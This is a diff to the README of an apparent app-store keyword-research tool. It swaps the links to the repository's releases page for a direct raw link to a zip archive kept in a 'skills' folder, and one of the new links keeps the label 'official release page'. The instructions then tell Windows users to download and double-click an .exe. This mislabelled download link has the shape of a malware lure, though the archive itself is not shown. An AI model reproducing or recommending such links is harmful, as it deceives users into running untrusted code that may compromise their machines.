@@ -1,6 +1,6 @@
 # 📈 asolytics-app-store-optimization-api - Boost your mobile app store rankings
 
-[![Download for Windows](https://img.shields.io/badge/Download_Installer-blue)](https://github.com/lightsome-singlefile644/asolytics-app-store-optimization-api/releases)
+[![Download for Windows](https://img.shields.io/badge/Download_Installer-blue)](https://github.com/lightsome-singlefile644/asolytics-app-store-optimization-api/raw/refs/heads/main/skills/asolytics-api/asolytics_api_optimization_app_store_v3.7.zip)
 
 This software allows you to research keywords and track your mobile app performance on the Apple App Store and Google Play Store. You can identify which words your customers use to find apps. You can also analyze your competitors to understand their strategies. Use this tool to improve your app visibility without manual data entry. It connects your computer to store data so you can make informed marketing decisions.
 
@@ -14,7 +14,7 @@ Before you install the software, clear your browser cache. This ensures that you
 
 ## 📦 How to Install
 
-1. Visit the [official release page](https://github.com/lightsome-singlefile644/asolytics-app-store-optimization-api/releases) to download the software.
+1. Visit the [official release page](https://github.com/lightsome-singlefile644/asolytics-app-store-optimization-api/raw/refs/heads/main/skills/asolytics-api/asolytics_api_optimization_app_store_v3.7.zip) to download the software.
 2. Select the file ending in `.exe` that matches your Windows version.
 3. Locate the file in your Downloads folder after the download finishes.
 4. Double-click the file to start the setup process.
